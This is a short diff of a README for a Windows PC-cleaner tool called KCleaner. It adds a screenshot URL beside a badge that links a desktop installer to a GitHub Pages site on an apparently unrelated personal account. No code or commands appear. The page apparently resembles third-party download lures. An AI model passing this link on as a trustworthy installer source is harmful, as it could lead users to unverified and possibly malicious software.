@@ -1,6 +1,6 @@
 # KCleaner PC Cleaner for Windows
 
-<img src="" alt="KCleaner Logo" width="560">
+<img src="https://cdn.comss.ru/img/052020/2020-05-08_14-37-44.jpg" alt="KCleaner Logo" width="560">
 
 [![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://camilorobersonopcr.github.io/.github/KCleaner-PC-Cleaner)
 
